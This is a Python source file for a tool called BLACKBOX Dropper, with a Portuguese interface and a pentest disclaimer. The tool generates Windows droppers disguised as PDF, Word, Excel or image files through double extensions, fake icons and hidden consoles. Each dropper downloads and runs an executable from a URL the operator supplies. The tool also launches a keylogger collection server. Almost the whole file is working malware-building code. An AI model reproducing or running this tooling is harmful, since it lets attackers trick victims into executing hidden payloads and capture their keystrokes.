#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# BLACKBOX Dropper v1.0
# https://github.com/Guilherme-alexander

import os
import sys
import random
import string
import subprocess
import platform

# Cores
WHITE = '\033[97m'
YELLOW = '\033[93m'
RED = '\033[91m'
END = '\033[0m'

# Estilos de texto
BOLD = '\033[1m'
DIM = '\033[2m'
ITALIC = '\033[3m'
UNDERLINE = '\033[4m'
BLINK = '\033[5m'
INVERT = '\033[7m'
HIDDEN = '\033[8m'
STRIKE = '\033[9m'

# Resets específicos
RESET_STYLE = '\033[22m'      # Reseta BOLD e DIM
RESET_ITALIC = '\033[23m'     # Reseta ITALIC
RESET_UNDERLINE = '\033[24m'  # Reseta UNDERLINE
RESET_BLINK = '\033[25m'      # Reseta BLINK
RESET_INVERT = '\033[27m'     # Reseta INVERT
RESET_HIDDEN = '\033[28m'     # Reseta HIDDEN
RESET_STRIKE = '\033[29m'     # Reseta STRIKE

def clear():
    """Limpa a tela do terminal para Windows e Linux"""
    os.system('cls' if os.name == 'nt' else 'clear')

def randomword(length):
    """Gera uma string aleatória"""
    return ''.join(random.choice(string.ascii_lowercase) for i in range(length))

def help_menu():
    """Exibe informações de ajuda"""
    clear()
    print(f"""{WHITE}
╔═══════════════════════════════════════════════════════════════════╗
║                                                                   ║
║   {YELLOW}🐦‍⬛ BLACKBOX DROPPER{YELLOW} - Ferramenta de Pentest{WHITE}                     ║
║                                                                   ║
╠═══════════════════════════════════════════════════════════════════╣
║                                                                   ║
║  {YELLOW}DESCRIÇÃO:{WHITE}                                                       ║
║  Ferramenta para criar droppers que baixam e executam             ║
║  payloads em sistemas Windows.                                    ║
║                                                                   ║
║  {YELLOW}COMO USAR:{WHITE}                                                       ║
║  • Selecione a opção {YELLOW}[1]{WHITE} para iniciar a geração                   ║
║  • Escolha o tipo de dropper {YELLOW}(PDF, WORD, EXCEL, IMAGE){WHITE}            ║
║  • Forneça as URLs do seu payload e do documento                  ║
║  • O dropper será compilado automaticamente                       ║
║                                                                   ║
║  {RED}⚠️  AVISO:{WHITE} Use apenas em ambientes autorizados!                  ║
║                                                                   ║
╚═══════════════════════════════════════════════════════════════════╝
{END}""")
    input(f"\n{YELLOW}[ENTER]{WHITE} para voltar ao menu...{END}")

def banner():
    """Exibe o banner do BLACKBOX - Design Moderno"""
    clear()
    
    # Banner ASCII com arte melhorada
    banner_art = f"""
     {YELLOW}██████╗ ██╗      █████╗  ██████╗██╗  ██╗██████╗  ██████╗ ██╗  ██╗{WHITE}
     {YELLOW}██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝██╔══██╗██╔═══██╗╚██╗██╔╝{WHITE}
     {YELLOW}██████╔╝██║     ███████║██║     █████╔╝ ██████╔╝██║   ██║ ╚███╔╝ {WHITE}
     {YELLOW}██╔══██╗██║     ██╔══██║██║     ██╔═██╗ ██╔══██╗██║   ██║ ██╔██╗ {WHITE}
     {YELLOW}██████╔╝███████╗██║  ██║╚██████╗██║  ██╗██████╔╝╚██████╔╝██╔╝ ██╗{WHITE}
     {YELLOW}╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝{WHITE}
                                                                                       
                        {RED}🔒 DROPPER & KEYLOGGER SUITE 🔒{WHITE}                        
"""
    
    print(banner_art)
    
    # Menu principal estilizado
    print(f"""    {YELLOW}┌─────────────────────────────────────────────────────────────────┐{WHITE}
    {YELLOW}│{WHITE}                                                                 {YELLOW}│{WHITE}
    {YELLOW}│{WHITE}  {YELLOW}▶{WHITE}  {WHITE}[{RED}1{WHITE}]  Gerar Dropper{WHITE}                                          {YELLOW}│{WHITE}
    {YELLOW}│{WHITE}  {YELLOW}▶{WHITE}  {WHITE}[{RED}2{WHITE}]  KeyLogger HiveServer                                   {YELLOW}│{WHITE}
    {YELLOW}│{WHITE}  {YELLOW}▶{WHITE}  {WHITE}[{RED}3{WHITE}]  Ajuda / Documentação                                   {YELLOW}│{WHITE}
    {YELLOW}│{WHITE}  {YELLOW}▶{WHITE}  {WHITE}[{RED}0{WHITE}]  Sair                                                   {YELLOW}│{WHITE}
    {YELLOW}│{WHITE}                                                                 {YELLOW}│{WHITE} 
    {YELLOW}└─────────────────────────────────────────────────────────────────┘{WHITE}

    {DIM}by: {WHITE}Guilherme Alexander {DIM}• {WHITE}https://github.com/Guilherme-alexander{DIM}
    {DIM}version: {WHITE}1.0{DIM}  •  {WHITE}⬛‍ BLACKBOX{DIM}  •  {WHITE}🐝 Hive{DIM}
{END}""")
    
    print(f"{YELLOW}┌─[{WHITE} BLACKBOX {YELLOW}]─[{WHITE} Escolha uma opção {YELLOW}]{END}")
    print(f"{YELLOW}└╼> {END}", end="")

def gen_menu():
    clear()
    """Exibe opções de geração de dropper"""
    print(f"""    {YELLOW}┌─────────────────────────────────────────────────────┐
    {YELLOW}│                {WHITE}📦 TIPOS DE DROPPER{YELLOW}                  │
    {YELLOW}├─────────────────────────────────────────────────────┤{WHITE}
    {YELLOW}│{WHITE}                                                     {YELLOW}│{WHITE}
    {YELLOW}│{WHITE}     [{YELLOW}1{WHITE}]  PDF DROPPER     {DIM}(PDF + EXE){END}                {YELLOW}│{WHITE}
    {YELLOW}│{WHITE}     [{YELLOW}2{WHITE}]  WORD DROPPER    {DIM}(DOCX + EXE){END}               {YELLOW}│{WHITE}
    {YELLOW}│{WHITE}     [{YELLOW}3{WHITE}]  EXCEL DROPPER   {DIM}(XLSX + EXE){END}               {YELLOW}│{WHITE}
    {YELLOW}│{WHITE}     [{YELLOW}4{WHITE}]  IMAGE DROPPER   {DIM}(JPG/PNG + EXE){END}            {YELLOW}│{WHITE}
    {YELLOW}│                                                     {YELLOW}│
    {YELLOW}│{WHITE}     [{RED}0{WHITE}]  Voltar ao menu principal                   {YELLOW}│{WHITE}
    {YELLOW}│                                                     {YELLOW}│{WHITE}
    {YELLOW}└─────────────────────────────────────────────────────┘
{END}""")
    print(f"{YELLOW}┌─[{WHITE} DROPPER {YELLOW}]─[{WHITE} Selecione o tipo {YELLOW}]─{END}")
    print(f"{YELLOW}└╼ {END}", end="")

def thanks():
    """Exibe mensagem de agradecimento"""
    print(f"""
{WHITE}╔═══════════════════════════════════════════════════════════════════╗
║                                                                   ║
║     {YELLOW}🌟 OBRIGADO POR USAR O BLACKBOX DROPPER!{WHITE}                      ║
║                                                                   ║
║     {DIM}🔗 https://github.com/Guilherme-alexander{END}{WHITE}                     ║
║                                                                   ║
║     {YELLOW}🐝 HiveServer{YELLOW}  •  {WHITE}🐦‍⬛ BLACKBOX{WHITE}  •  {RED}🔒 Security{WHITE}                 ║
║                                                                   ║
╚═══════════════════════════════════════════════════════════════════╝
{END}""")

def disclaimer():
    """Exibe o aviso legal"""
    clear()
    print(f"""{WHITE}
╔═══════════════════════════════════════════════════════════════════╗
║                                                                   ║
║                         {RED}⚠️  AVISO LEGAL{WHITE}                           ║
║                                                                   ║
╠═══════════════════════════════════════════════════════════════════╣
║                                                                   ║
║  {YELLOW}📌 Este software é fornecido apenas para fins educacionais{WHITE}       ║
║     e testes de penetração em ambientes autorizados.              ║
║                                                                   ║
║  {RED}🚫 NÃO{WHITE} utilize este software para atividades ilegais ou          ║
║     não autorizadas. O autor não se responsabiliza por            ║
║     qualquer uso indevido.                                        ║
║                                                                   ║
║  {YELLOW}✅ Use APENAS em sistemas que você possui autorização{WHITE}            ║
║     para testar.                                                  ║
║                                                                   ║
║  {DIM}"Um espírito nobre engrandece o menor dos homens"{END}{WHITE}                ║
║                                                                   ║
╚═══════════════════════════════════════════════════════════════════╝
{END}""")
    input(f"\n{YELLOW}[ENTER]{WHITE} para continuar...{END}")

def begin():
    """Gera o payload do dropper"""
    clear()
    print(f"""{WHITE}
╔═══════════════════════════════════════════════════════════════════╗
║                                                                   ║
║                   {YELLOW}📦 CONFIGURAÇÃO DO DROPPER{WHITE}                      ║
║                                                                   ║
╚═══════════════════════════════════════════════════════════════════╝
{END}""")
    
    print(f"\n{YELLOW}[!]{WHITE} Atenção! Coloque a URL direta! Ex: {YELLOW}http://192.168.1.2/payload.exe{WHITE}")
    print(f"{YELLOW}[*]{WHITE} Lembre-se de incluir http ou https.\n")
    
    url_d = input(f"{YELLOW}📥{WHITE} URL do EXE para baixar: {END}")
    embed_d = input(f"{YELLOW}📄{WHITE} URL do arquivo para embutir: {END}")
    
    # Detecta o tipo de arquivo pela URL
    if 'pdf' in embed_d.lower():
        nameph = randomword(10) + '.pdf'
    elif 'docx' in embed_d.lower():
        nameph = randomword(10) + '.docx'
    elif 'xlsx' in embed_d.lower():
        nameph = randomword(10) + '.xlsx'
    elif 'jpg' in embed_d.lower():
        nameph = randomword(10) + '.jpg'
    elif 'png' in embed_d.lower():
        nameph = randomword(10) + '.png'
    else:
        nameph = randomword(10) + '.pdf'
    
    # Lê o template
    with open('Templates/U_dRoP.py', 'r') as template:
        o = template.read()
    
    # Constrói o payload
    payload = '#!/usr/bin/python3\n'
    payload += '# -*- coding: iso-8859-15 -*-\n'
    payload += 'import os\n'
    payload += 'from sys import exit\n'
    payload += 'import random\n'
    payload += 'try:\n'
    payload += '    from urllib.request import urlretrieve\n'
    payload += 'except ImportError:\n'
    payload += '    from urllib import urlretrieve\n'
    payload += 'from shutil import move\n'
    payload += f"url_d = '{url_d}'\n"
    payload += f"embed_d = '{embed_d}'\n"
    payload += f"nameph = '{nameph}'\n"
    payload += str(o)
    
    with open('D.py', 'w') as f:
        f.write(payload)

def build_dropper(choice):
    """Constrói o dropper com PyInstaller"""
    begin()
    
    configs = {
        '1': {
            'version': 'Resource/pdf.template',
            'icon': 'Icons/pdf.ico',
            'name': 'Blackbox_Pdf_.pdf.exe',
            'manifest': '--manifest=Manifest/manifest.manifest'
        },
        '2': {
            'version': 'Resource/word.template',
            'icon': 'Icons/word.ico',
            'name': 'Blackbox_Word_.docx.exe',
            'manifest': '--manifest=Manifest/manifest.manifest'
        },
        '3': {
            'version': 'Resource/excel.template',
            'icon': 'Icons/excel.ico',
            'name': 'Blackbox_Excel_.xlsx.exe',
            'manifest': '--manifest=Manifest/manifest.manifest'
        },
        '4': {
            'version': None,
            'icon': 'Icons/img.ico',
            'name': 'Blackbox_Img_.jpg.exe',
            'manifest': ''
        }
    }
    
    config = configs.get(choice)
    if not config:
        return
    
    # Comando PyInstaller
    if sys.platform == 'win32':
        pyinstaller = 'pyinstaller'
    else:
        pyinstaller = '/root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py'
    
    cmd = f'{pyinstaller} --noconsole'
    
    if config['manifest'] and os.path.exists('Manifest/manifest.manifest'):
        cmd += f' {config["manifest"]}'
    
    if config['version'] and os.path.exists(config['version']):
        cmd += f' --version-file={config["version"]}'
    
    if config['icon'] and os.path.exists(config['icon']):
        cmd += f' -i {config["icon"]}'
    
    cmd += ' -F D.py'
    
    print(f"\n{YELLOW}[*]{WHITE} Construindo dropper...{END}")
    print(f"{DIM}   {cmd}{END}")
    os.system(cmd)
    
    # Limpeza
    import shutil
    for item in ['build', 'D.spec', 'D.py']:
        if os.path.exists(item):
            if os.path.isdir(item):
                shutil.rmtree(item, ignore_errors=True)
            else:
                try:
                    os.remove(item)
                except:
                    pass
    
    if os.path.exists('dist/D.exe'):
        os.rename('dist/D.exe', 'dist/' + config['name'])
    
    clear()
    print(f"""{WHITE}
╔═══════════════════════════════════════════════════════════════════╗
║                                                                   ║
║                  {YELLOW}✅  DROPPER GERADO COM SUCESSO!{WHITE}                  ║
║                                                                   ║
╚═══════════════════════════════════════════════════════════════════╝

    {YELLOW}📦 Arquivo:{WHITE} {config['name']}
    {YELLOW}📁 Local:{WHITE}  dist/{config['name']}
{END}""")
    
    choice = input(f"\n{YELLOW}[?]{WHITE} Deseja sair ou voltar ao menu? ({YELLOW}S{WHITE}/{YELLOW}V{WHITE}): {END}")
    if choice.upper() in ['S', 'SAIR', 'Q', 'QUIT']:
        clear()
        thanks()
        sys.exit(0)

def launch_hive_server():
    """Lança o HiveServer"""
    clear()
    print(f"""{WHITE}
╔═══════════════════════════════════════════════════════════════════╗
║                                                                   ║
║                     {YELLOW}🐝  INICIANDO HIVE SERVER{WHITE}                     ║
║                                                                   ║
╚═══════════════════════════════════════════════════════════════════╝
{END}""")
    
    try:
        if os.path.exists('HiveServer.py'):
            print(f"{YELLOW}[*]{WHITE} Localizando HiveServer.py...{END}")
            print(f"{YELLOW}[*]{WHITE} Inicializando servidor...{END}\n")
            
            if sys.platform == 'win32':
                subprocess.run(['python', 'HiveServer.py'])
            else:
                subprocess.run(['python3', 'HiveServer.py'])
        else:
            print(f"{RED}[!]{WHITE} Erro: HiveServer.py não encontrado!{END}")
            print(f"{YELLOW}[*]{WHITE} Certifique-se que o arquivo está na mesma pasta{END}")
            input(f"\n{YELLOW}[ENTER]{WHITE} para continuar...{END}")
    except Exception as e:
        print(f"{RED}[!]{WHITE} Erro ao iniciar HiveServer: {e}{END}")
        input(f"\n{YELLOW}[ENTER]{WHITE} para continuar...{END}")

def main():
    """Loop principal do programa"""
    if os.name == 'posix' and os.geteuid() != 0:
        sys.exit(f'{RED}[!]{WHITE} BLACKBOX deve ser executado como root{END}')
    
    clear()
    disclaimer()
    
    while True:
        banner()
        
        try:
            choice = input()
            
            # Menu principal
            if choice == '0':
                clear()
                thanks()
                sys.exit(0)
            elif choice == '3':
                help_menu()
            elif choice == '2':
                launch_hive_server()
            elif choice == '1':
                # Submenu de geração
                while True:
                    gen_menu()
                    sub_choice = input()
                    
                    if sub_choice == '0':
                        break
                    elif sub_choice in ['1', '2', '3', '4']:
                        build_dropper(sub_choice)
                        break
                    else:
                        print(f"\n{RED}[!]{WHITE} Opção inválida!{END}")
                        input(f"{YELLOW}[ENTER]{WHITE} para continuar...{END}")
            else:
                print(f"\n{RED}[!]{WHITE} Opção inválida! Use {YELLOW}0{WHITE}, {YELLOW}1{WHITE}, {YELLOW}2{WHITE} ou {YELLOW}3{END}")
                input(f"{YELLOW}[ENTER]{WHITE} para continuar...{END}")
                
        except KeyboardInterrupt:
            clear()
            thanks()
            sys.exit(0)

if __name__ == '__main__':
    main()